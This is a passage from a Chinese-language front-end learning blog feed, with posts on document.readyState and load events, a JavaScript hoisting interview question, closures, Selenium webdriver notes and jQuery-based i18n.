<td>The object body has been closed and the loading is finished.</td>
</tr>
</tbody>
</table>
<p>这个是关于IE的</p>
<blockquote>
<p><a href="https://msdn.microsoft.com/en-us/library/ms534359(v=vs.85" target="_blank" rel="external">msdn</a>.aspx)<br>Note  For the script element, readyState is no longer supported. Starting with Internet Explorer 11, use onload.</p>
</blockquote>
<p>这段话也从github的注释上看到了.<br>类似的initLoader在<a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/readyState" target="_blank" rel="external">mdn</a>发现啦~</p>
<p>简单的通过readyState进行事件加载:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">document</span>.readyState == <span class="string">"complete"</span>) &#123;</span><br><span class="line">		initApplications();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="那么关于window-onload-amp-amp-interactive"><a href="#那么关于window-onload-amp-amp-interactive" class="headerlink" title="那么关于window.onload &amp;&amp; interactive"></a>那么关于window.onload &amp;&amp; interactive</h3><p>写完想到了这个问题, 已经有人回答了</p>
<blockquote>
<p><a href="http://stackoverflow.com/questions/2457405/what-is-the-difference-between-window-load-and-document-readystate" target="_blank" rel="external">What is the difference between Window.load and document.readyState</a><br>window.load - This runs when <code>all content</code> is loaded, including images.<br>document.ready - This runs when the <code>DOM is ready</code>, all the elements are on the page and ready to do, but the images aren’t necessarily loaded.</p>
</blockquote>
<p>第二篇参考文: <a href="https://segmentfault.com/q/1010000000667904" target="_blank" rel="external">window.onload和jquery.ready有什么区别么？ - segmentfault</a><br><strong>代码演示</strong>: // 必须放在头才能了解具体加载</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://cdn.bootcss.com/jquery/3.1.1/jquery.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">		$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			alert(<span class="built_in">document</span>.readyState);</span><br><span class="line">		&#125;);</span><br><span class="line">		<span class="comment">// Interactive</span></span><br><span class="line"></span><br><span class="line">		$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			alert(<span class="built_in">document</span>.readyState);</span><br><span class="line">		&#125;);</span><br><span class="line">		<span class="comment">// Interactive</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">				alert(<span class="built_in">document</span>.readyState);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// Complete</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// HTML4</span></span><br><span class="line">		<span class="built_in">document</span>.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">document</span>.readyState == <span class="string">'interactive'</span>) &#123;</span><br><span class="line">				alert(<span class="built_in">document</span>.readyState);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="comment">// Interactive</span></span><br><span class="line"></span><br><span class="line">		HTML5</span><br><span class="line">		<span class="built_in">document</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			alert(<span class="built_in">document</span>.readyState);</span><br><span class="line">		&#125;);</span><br><span class="line">		<span class="comment">// Interactive</span></span><br><span class="line"></span><br><span class="line">		$(<span class="built_in">window</span>).on(<span class="string">'load'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			alert(<span class="built_in">document</span>.readyState);</span><br><span class="line">		&#125;);</span><br><span class="line">		<span class="comment">//	Complete</span></span><br><span class="line">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Online Code: 打开<code>F12</code>看看?</p>
<iframe height="300" scrolling="no" title="window.onload VS $(document).ready() .etc" src="//codepen.io/a1exlism/embed/LbBojb/?height=300&theme-id=26570&default-tab=html&embed-version=2" frameborder="no" allowtransparency="true" allowfullscreen="true" style="width: 100%;">See the Pen <a href="http://codepen.io/a1exlism/pen/LbBojb/" target="_blank" rel="external">window.onload VS $(document).ready() .etc</a> by Quentin Smith (<a href="http://codepen.io/a1exlism" target="_blank" rel="external">@a1exlism</a>) on <a href="http://codepen.io" target="_blank" rel="external">CodePen</a>.<br></iframe>


<p>看了表格又想了另一个问题</p>
<blockquote>
<p><a href="http://stackoverflow.com/questions/3665561/document-readystate-of-interactive-vs-ondomcontentloaded" target="_blank" rel="external">document.readystate of “interactive” vs. ondomcontentloaded?</a><br>To summaries what it means:</p>
<ol>
<li>JavaScripts that must <code>run right</code> after parsing are executed “list-of-scripts-that-will-execute-when-the-document-has-fin‌​ished-parsing” are executed</li>
<li>DomContentLoaded event fires(发起domContentLoad事件)</li>
<li>JavaScripts “list-of-scripts-that-will-execute-in-order-as-soon-as-possi‌​ble” are executed(尽快加载js)</li>
<li>readyState changes to <code>&quot;complete&quot;</code> (instead of “interactive”) and <code>triggering the &quot;onload&quot; start event</code>.</li>
</ol>
</blockquote>
<p>这样的话关于readyState的<code>interactive-&gt;compelete</code>的过程也能完美的解释清楚了, 所以一般js真正执行是在readyState === ‘complete’之后.</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://taligarsiel.com/Projects/howbrowserswork1.htm" target="_blank" rel="external">How browsers work</a><br><strong><a href="http://coolshell.cn/articles/9666.html" target="_blank" rel="external">浏览器的渲染原理简介-陈皓</a></strong> &lt;= 优先看<br><a href="https://segmentfault.com/a/1190000004292479#articleHeader3" target="_blank" rel="external">JS 一定要放在 Body 的最底部么？聊聊浏览器的渲染机制 - 德来</a><br><a href="https://segmentfault.com/a/1190000005598925" target="_blank" rel="external">浏览器渲染的那些事</a><br><a href="http://www.html-js.com/article/3000" target="_blank" rel="external">网页渲染-前端乱炖</a></p>
<h2 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h2><p>这次学到的东西真的不少, 以后自己应该回来多翻看的了~</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[JS面试题1-分析]]></title>
      <url>http://csser.work/12/02/2016/js-interview-1/</url>
      <content type="html"><![CDATA[<h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p><a href="gold.xitu.io/">@掘金</a>上看到的, 做了发现以前看得都还给书本了.<br>题目博客地址: <a href="http://www.cnblogs.com/xxcanghai/p/5189353.html#!comments" target="_blank" rel="external">http://www.cnblogs.com/xxcanghai/p/5189353.html#!comments</a></p>
<h2 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h2><p>变量提升, 变量声明优先级, 函数表达式VS变量声明, js对象继承, 构造函数, this指向, 运算符优先级</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	line-1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="number">1</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// console.log(this);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//	line-2</span></span><br><span class="line">Foo.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="number">2</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//	line-3</span></span><br><span class="line">Foo.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	alert(<span class="number">3</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//	line-4</span></span><br><span class="line"><span class="keyword">var</span> getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="number">4</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//	line-5</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//请写出以下输出结果：</span></span><br><span class="line">Foo.getName();</span><br><span class="line">getName();</span><br><span class="line">Foo().getName();</span><br><span class="line">getName();</span><br><span class="line"><span class="keyword">new</span> Foo.getName();</span><br><span class="line"><span class="keyword">new</span> Foo().getName();</span><br><span class="line"><span class="keyword">new</span> <span class="keyword">new</span> Foo().getName();</span><br></pre></td></tr></table></figure>
<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><h3 id="0x00-通读"><a href="#0x00-通读" class="headerlink" title="0x00 通读"></a>0x00 通读</h3><ol>
<li>line-1中的getName是一个全局函数变量</li>
<li>line-4是一个变量声明和赋值两个过程</li>
<li>line-5是一个函数声明</li>
</ol>
<h3 id="0x01-Foo-getName"><a href="#0x01-Foo-getName" class="headerlink" title="0x01 Foo.getName();"></a>0x01 Foo.getName();</h3><p>按照前面讲的, 根据原型链查找, 直接找到了line-2函数, 输出: 2</p>
<h3 id="0x02-getName"><a href="#0x02-getName" class="headerlink" title="0x02 getName();"></a>0x02 getName();</h3><blockquote>
<p>小笔记<br>函数变量声明优先级比变量声明高, 变量提升仅仅提升了<code>变量声明</code>.<a href="https://gist.github.com/a1exlism/de8e79a5607c05677c2bdc89ce982714" target="_blank" rel="external">demo演示</a></p>
</blockquote>
<p>执行顺序依次: line-5函数声明, line-4变量声明, line-4变量赋值, getName()</p>
<h3 id="0x03-Foo-getName"><a href="#0x03-Foo-getName" class="headerlink" title="0x03 Foo().getName();"></a>0x03 Foo().getName();</h3><p>这题仔细看, 然后看一下0x00.<br>在line-1中返回了this, 这个this向上查找对象, 最后找到了<code>window</code>对象(浏览器), 所以真正执行的函数应该是<code>window.getName()</code>, 而line-1将这个全局变量进行了赋值, so…</p>
<h3 id="0x04-getName"><a href="#0x04-getName" class="headerlink" title="0x04 getName();"></a>0x04 getName();</h3><p>由于Foo()被执行, 全局变量被污染, 所以和上题答案一样</p>
<h3 id="下面三题和运算符优先级相关"><a href="#下面三题和运算符优先级相关" class="headerlink" title="下面三题和运算符优先级相关"></a>下面三题和运算符优先级相关</h3><p>Reference:<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Operator_Precedence" target="_blank" rel="external">运算符优先级-MDN</a><br>园括号 &gt; 成员访问 &gt; 计算型成员访问 &gt; new([x]) &gt; 函数调用 &gt; new<br><code>() &gt; ... . ... &gt; ...[...] &gt; new ...(...) &gt; ...(...) &gt; new ...</code><br>new操作顺序<code>从右到左</code>, 注意: new func <code>也算带参数</code></p>
<h3 id="0x05-new-Foo-getName"><a href="#0x05-new-Foo-getName" class="headerlink" title="0x05 new Foo.getName();"></a>0x05 new Foo.getName();</h3><p>即new (Foo.getName)()</p>
<p>如果把上面那句改成<code>new Date();</code>是不是一下看懂了呢.构造函数的new操作~</p>
<h3 id="0x06-new-Foo-getName"><a href="#0x06-new-Foo-getName" class="headerlink" title="0x06 new Foo().getName();"></a>0x06 new Foo().getName();</h3><p>理解为: (new Foo().getName)();<br>差点忘记, 这边返回了this, 然后对象找不到直接的getName函数, 于是跟着原型链把line-3的函数继承上去.</p>
<h3 id="0x07-new-new-Foo-getName"><a href="#0x07-new-new-Foo-getName" class="headerlink" title="0x07 new new Foo().getName();"></a>0x07 new new Foo().getName();</h3><p>理解为: (new (new Foo().getName))();<br>(new Foo().getName) 表示的是构造函数, 然后就和0x05一样的理解即可.</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[JS闭包]]></title>
      <url>http://csser.work/12/02/2016/js-closure/</url>
      <content type="html"><![CDATA[<h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>看问题的时候顺便看到了, <a href="http://www.cnblogs.com/xxcanghai/p/4991870.html" target="_blank" rel="external">闭包面试题</a><br>面试题看到最后一行的时候有点不清楚, 干脆重新理解一遍.</p>
<h2 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h2><p>个人理解:<br><br>看了<a href="https://developer.mozilla.org/cn/docs/Web/JavaScript/Closures" target="_blank" rel="external">MDN</a>, 总结了一些结论<br>闭包就是一个 函数加上该函数的上下文环境 的集合.</p>
<p>一个比较常见的例子:<br>HTML:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"divs"</span>&gt;</span> aaa <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"divs"</span>&gt;</span> aaa <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"divs"</span>&gt;</span> aaa <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>Javascript:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> divs = <span class="built_in">document</span>.querySelectorAll(<span class="string">'.divs'</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; divs.length; i++)&#123;</span><br><span class="line">		divs[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="built_in">console</span>.log(i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
<p>无论点哪个都只会输出3, 原因讲的已经很明确了, 在这个函数内部的上下文环境中, i会共用.<br>可能会问, 如果共用, 那么绑定的也只有第三个=&gt; 在绑定的时候i还是从0-&gt;2的, 但是事件触发一定是i在等于3之后的事情了.</p>
<p>解决办法: 闭包传参, ES6新特性:let<br>这边给个闭包传参的例子:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> divs = <span class="built_in">document</span>.querySelectorAll(<span class="string">'.divs'</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; divs.length; i++) &#123;</span><br><span class="line">		divs[i].onclick = (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">			<span class="built_in">console</span>.log(i);</span><br><span class="line">		&#125;)(i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
<p>这样每一个onclick都被赋予了一个独立的闭包,可以独立输出0-2.</p>
<p>另一个模拟类的例子:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shoppingCart</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> goods = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        goodsAdd: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            ++goods;</span><br><span class="line">        &#125;,</span><br><span class="line">        goodsRemove: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            --goods;</span><br><span class="line">        &#125;,</span><br><span class="line">        goodsShow: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> goods;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> cartA = <span class="keyword">new</span> shoppingCart();</span><br><span class="line"><span class="keyword">var</span> cartB = <span class="keyword">new</span> shoppingCart();</span><br><span class="line">cartA.goodsAdd();</span><br><span class="line">cartA.goodsShow();</span><br><span class="line"></span><br><span class="line">cartB.goodsAdd();</span><br><span class="line">cartB.goodsRemove();</span><br><span class="line">cartB.goodsShow();</span><br></pre></td></tr></table></figure></p>
<p>shoppingCart函数有个函数内变量goods, 外部无法访问, 但是它可以通过内部的函数访问到, 即整个shoppingCart函数<code>构成了一个闭包环境</code>.<br>问了一下同学, <code>这个很像面向对象的一个类</code>, goods就是所谓的private变量了.<br>而new出来的对象都是一个独立的闭包, 拥有独立的上下文环境和内容</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[webdriver with python]]></title>
      <url>http://csser.work/11/29/2016/py-webdriver/</url>
      <content type="html"><![CDATA[<h2 id="defined"><a href="#defined" class="headerlink" title="defined"></a>defined</h2><p>写webdriver的目的: 作业驱动型.<br>写这篇博客目的: 以后用来作索引, 毕竟python还没开始学= =</p>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h2><p>讲道理webdriver这个还挺简单的, 各种API封装的和前端基本上一模一样~<br>这边记录下写的时候遇到的收藏夹:</p>
<ol>
<li><a href="https://zhidao.baidu.com/question/265128148922415765.html" target="_blank" rel="external">python字符串前缀u和r</a><br>在python2里面，u表示unicode string，类型是unicode, 没有u表示byte string，类型是 str<br>在python3里面，所有字符串都是unicode string, u前缀没有特殊含义了</li>
<li>selenium 获取dom元素属性: a.get_attribute(‘href’)<br>文本内容: a.text</li>
<li>关于断言=&gt;<code>Expected Conditions</code>, 可以看看这个中文解释文档:<a href="http://www.cnblogs.com/nbkhic/p/4885041.html#undefined#undefined" target="_blank" rel="external">python selenium expected_conditions使用实例
</a></li>
<li>关于Selenium的官方文档戳这: <a href="http://selenium-python.readthedocs.io/getting-started.html" target="_blank" rel="external">selenium-python</a></li>
<li><a href="http://cn.python-requests.org/zh_CN/latest/" target="_blank" rel="external">Request-python</a> 关于request的python官方文档</li>
<li>Python保存时提示”SyntaxError: Non-ASCII character ‘\xe8’ in file” =&gt; 添加如下语句: <code># -*- coding: utf-8 -*-</code></li>
<li><p>UnicodeEncodeError: ‘ascii’ codec can’t encode characters in position =&gt; 添加</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding( <span class="string">"utf-8"</span> )</span><br></pre></td></tr></table></figure>
</li>
<li><p><a href="https://sites.google.com/a/chromium.org/chromedriver/getting-started" target="_blank" rel="external">ChromeDriver</a>官方文档</p>
</li>
</ol>
<h2 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h2><p>这个暂时也不知道拿来干嘛, 等以后用到再说, 做个收藏夹~</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[i18n国际化纯前端渲染]]></title>
      <url>http://csser.work/11/28/2016/i18n-with-jquery/</url>
      <content type="html"><![CDATA[<h2 id="Defined"><a href="#Defined" class="headerlink" title="Defined"></a>Defined</h2><p>项目中有个小要求, 面向的用户主要是英语和西班牙语.<br>也没有搞过, 本来还以为需要写多页面= =</p>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h2><h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>只能实现固定的文字替换, 动态替换这个功能如果有需求则后续更新~</p>
<h3 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h3><p>利用<code>html5自定义标签 + ajax + json字典</code>传输回调进行实时无刷新替换语言,<br>所以主要难点就是数据模式设置和json处理了</p>
<h3 id="目录树"><a href="#目录树" class="headerlink" title="目录树"></a>目录树</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-langs</span><br><span class="line"> |-en_US.json</span><br><span class="line"> |-es_ES.json</span><br><span class="line"> |-zh_CN.json</span><br><span class="line">-js</span><br><span class="line"> |-main.js</span><br></pre></td></tr></table></figure>
<h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><ol>
<li><p>HTML with data-* DIY tags</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 语言切换选项 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span> <span class="attr">role</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">data-lang</span>=<span class="string">"chinese"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>[中文]Chinese<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">data-lang</span>=<span class="string">"english"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>[English]English<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">data-lang</span>=<span class="string">"spanish"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>[Español]Spanish<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 显示内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"search"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h2</span> <span class="attr">data-locale</span>=<span class="string">"title"</span>&gt;</span>Watch Search<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">label</span> <span class="attr">data-locale</span>=<span class="string">"label"</span>&gt;</span>Option: <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">data-opt</span>=<span class="string">"username"</span> <span class="attr">selected</span>=<span class="string">"selected"</span> <span class="attr">data-locale</span>=<span class="string">"op-1"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">data-opt</span>=<span class="string">"imei"</span> <span class="attr">data-locale</span>=<span class="string">"op-2"</span>&gt;</span>Watch IMEI<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">data-opt</span>=<span class="string">"phone_number"</span> <span class="attr">data-locale</span>=<span class="string">"op-3"</span>&gt;</span>Phone number<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>JavaScript伪代码(with jQuery)</p>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	变量设置</span></span><br><span class="line"><span class="keyword">var</span> xxx = $(<span class="string">'xxx'</span>),</span><br><span class="line">		<span class="comment">/* codes */</span></span><br><span class="line">		yyy = $(<span class="string">'yyy'</span>);</span><br><span class="line"><span class="comment">//	语言设置的主要代码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">langSet</span>(<span class="params">lang</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> dataSearch = data[<span class="string">'tab-search'</span>];</span><br><span class="line">	$(tabSearch).find(<span class="string">'h2'</span>).html(dataSearch[<span class="string">'title'</span>]);</span><br><span class="line">	$(tabSearch).find(<span class="string">'label'</span>).text(dataSearch[<span 